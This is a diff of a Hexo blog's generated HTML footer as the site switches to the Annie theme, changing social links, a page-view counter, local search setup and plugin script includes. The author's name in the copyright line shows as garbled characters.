+				<i class="fa fa-github"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-weibo"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-pinterest"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-instagram"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-twitter"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/atom.xml" target="_blank">
+				<i class="fa fa-rss"></i>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+		
+	<div class="copyright">
+		<p>
+			 
+				&copy;2017 - 2019, content by Ƥ������. All Rights Reserved.
+			
+			
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+		
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+
+		<span id="busuanzi_container_page_pv">
+	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+		</span>
+
+	
+
+
+
+
+		</p>
+		<p>
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
 </footer>
-    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/js/share.js'];</script>
+		
+	<!-- set '1' to show motto in all pages! -->
 
-<script src="/js/jquery-3.3.1.min.js"></script>
+	<script src="/plugin/motto/motto.js"></script>
+	
+	<script type="text/javascript">
+		$(".motto").html( getMingYanContent() );
+	</script>	
 
 
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  <script src="/fancybox/jquery.fancybox.pack.js"></script>
 
 
-<script src="/js/script.js"></script>
+	<!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup">
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      		ESC
+   		</span>
+		<div class="local-search-header">
+			<div class="input-prompt">				
+			</div>
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			<div class="topN-post">				
+				
+								
+			</div>
+		</div>
+	</div>
+</div>
 
-<script src="/js/navigation.js"></script>
+<script src="/plugin/search/ziploader.js"></script>
+<script src="/plugin/search/search.js"></script>
 
-<div id="bg"></div>
+<script type="text/javascript">
+	var search_path = 'search.json',
+		zip_Path = '/search.zip',
+		version_Path = '/searchVersion.txt',
+		input_Trigger = 'auto',
+		top_N = '2';
 
-  </div>
-</body>
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+<!-- love effect -->
+
+	<script src="/plugin/love/love.js"></script>
+
+
+<!-- back to top -->
+
+	
+	<div id="totop">
+  		<a href="javascript:;" name="TOTOP" class="fa fa-arrow-up"></a>
+	</div>
+
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<script src="/plugin/vibrant/vibrant.js"></script>
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imgLazyLoader/yall.min.js"></script>
+<script src="/plugin/imgResize/jquery.resizeimagetoparent.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/js/resizediv.js"></script>
+<script src="/js/main.js"></script>
+	</body>	
 </html>
